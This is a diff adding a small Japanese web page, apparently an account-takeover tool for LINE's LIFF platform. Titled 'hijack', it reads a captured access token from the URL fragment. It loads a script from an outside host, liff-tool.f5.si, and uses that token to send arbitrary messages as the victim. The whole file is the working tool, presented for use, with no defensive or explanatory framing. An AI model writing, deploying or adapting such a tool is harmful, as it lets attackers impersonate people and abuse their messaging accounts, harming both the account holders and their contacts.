@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AKツール</title>
+    <link href="./style.css" rel="stylesheet">
+</head>
+<body>
+  <font face="sans-serif">
+  <h1>乗っ取り</h1>
+  <p>メッセージ送信</p>
+  <input type="text" id="text"><button type="button" onclick=send()>送信</button>
+  <p id="log"></p>
+  </font>
+  <script src="https://liff-tool.f5.si/mod.js"></script>
+  <script>
+    var token=location.hash.substr(1);
+    function send(){
+        let text=document.getElementById("text").value;
+        liffmod.token.sendMessages([
+    {
+      type: "text",
+      text: text,
+    },
+  ],token)
+  .then(() => {
+    document.getElementById("log").innerHTML="送信しました";
+  })
+  .catch((err) => {
+    document.getElementById("log").innerHTML="エラー："+err;
+  });
+    }
+  </script>
+</body>
+</html>
